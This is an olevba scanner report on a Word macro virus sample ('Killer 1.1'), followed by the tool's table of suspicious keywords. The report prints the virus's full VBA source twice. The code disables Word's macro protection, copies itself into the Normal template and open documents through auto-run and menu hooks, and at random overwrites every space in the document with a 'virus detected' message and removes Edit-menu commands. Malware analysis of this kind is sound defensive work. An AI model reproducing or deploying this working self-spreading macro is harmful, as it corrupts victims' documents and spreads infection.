olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Winn-f22f8666cb0c7d73714d2686c775457986c6ee4c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Winn-f22f8666cb0c7d73714d2686c775457986c6ee4c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO killer.bas 
in file: Virus.MSWord.Winn-f22f8666cb0c7d73714d2686c775457986c6ee4c - OLE stream: 'Macros/VBA/killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub filesave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub autoclose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .TEXT = " "
            .Replacement.TEXT = "Íà êàìïå îáíàðóæåí âèðóñ!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer1.bas 
in file: Virus.MSWord.Winn-f22f8666cb0c7d73714d2686c775457986c6ee4c - OLE stream: 'Macros/VBA/killer1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub filesave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub autoclose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .TEXT = " "
            .Replacement.TEXT = "Íà êàìïå îáíàðóæåí âèðóñ!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

